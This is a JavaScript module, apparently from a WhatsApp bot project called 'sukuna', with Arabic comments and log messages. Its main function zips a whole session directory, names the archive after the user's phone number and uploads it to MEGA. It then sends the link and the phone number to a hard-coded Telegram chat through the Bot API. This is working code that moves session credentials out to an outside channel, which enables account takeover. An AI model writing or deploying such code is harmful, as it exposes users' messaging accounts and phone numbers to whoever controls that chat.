/* تـم الـتـنـسـيـق بـحـسـب طـلـب الـمـطـور: آدم (شادو) 🍁 */

import archiver from 'archiver';
import fs from 'fs';
import path from 'path';
import axios from 'axios';
import { upload } from './mega.js';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = '-1004465532873';

export async function sendSessionToMega(sessionDir, phoneNumber) {
  const zipBuffer = await createZipBuffer(sessionDir);
  
  // 1️⃣ رفع الملف على MEGA
  const fileName = `sukuna_session_${phoneNumber}_${Date.now()}.zip.enc`;
  console.log(`📤 جاري رفع الجلسة على MEGA...`);
  const megaUrl = await upload(zipBuffer, fileName);
  console.log(`✅ تم الرفع: ${megaUrl}`);

  // 2️⃣ إرسال الرابط على تليجرام (مش الملف نفسه)
  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    const caption = [
      `🕸 *جلسة سوكونا جديدة*`,
      ``,
      `📱 الرقم: ${phoneNumber}`,
      `⏰ التوقيت: ${new Date().toLocaleString('ar-EG')}`,
      `📦 الحجم: ${(zipBuffer.length / 1024).toFixed(2)} KB`,
      ``,
      `🔗 *رابط MEGA:*`,
      `\`${megaUrl}\``,
      ``,
      `🔐 الملف مشفّر - البوت الرئيسي هيفكه تلقائياً`
    ].join('\n');

    try {
      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: TELEGRAM_CHAT_ID,
          text: caption,
          parse_mode: 'Markdown'
        }
      );
      console.log('✅ تم إرسال الرابط على تليجرام');
    } catch (e) {
      console.error('❌ فشل إرسال الرابط على تليجرام:', e.message);
    }
  }

  return megaUrl;
}

function createZipBuffer(dirPath) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    const archive = archiver('zip', { zlib: { level: 9 } });
    
    archive.on('data', chunk => chunks.push(chunk));
    archive.on('end', () => resolve(Buffer.concat(chunks)));
    archive.on('error', reject);
    
    archive.directory(dirPath, false);
    archive.finalize();
  });
}